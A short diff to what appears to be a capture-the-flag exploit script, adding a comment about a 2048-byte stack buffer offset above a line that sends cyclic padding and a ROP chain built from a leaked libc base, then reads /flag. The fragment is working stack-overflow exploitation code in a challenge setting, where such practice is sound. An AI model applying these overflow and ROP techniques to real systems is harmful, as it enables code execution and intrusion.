@@ -64,6 +64,7 @@ def main_9():
 
     print(f"base of libc: 0x{base_libc:x}")
 
+    # lea    rax,[rbp-0x800] 0x800 = 2048
     io.sendline(cyclic(2048+8) + rop(base_libc))
 
     system("cat /flag")
